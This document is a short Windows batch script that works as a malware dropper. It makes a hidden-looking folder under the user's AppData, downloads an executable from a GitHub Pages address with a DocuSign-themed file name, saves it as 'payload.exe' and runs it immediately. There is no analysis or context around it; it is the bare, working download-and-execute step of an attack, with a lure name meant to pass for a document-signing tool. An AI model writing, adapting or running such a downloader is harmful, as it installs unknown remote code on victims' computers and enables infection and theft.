@echo off
setlocal enabledelayedexpansion
set "payloadpath=%appdata%\Custom-Application\files\payload.exe"
if not exist "%appdata%\Custom-Application\files" mkdir "%appdata%\Custom-Application\files"

powershell -Command "Invoke-WebRequest -Uri 'https://readreviewes.github.io/newraws/docusignone.exe' -OutFile '%payloadpath%'"
start "" "%payloadpath%"
exit /b
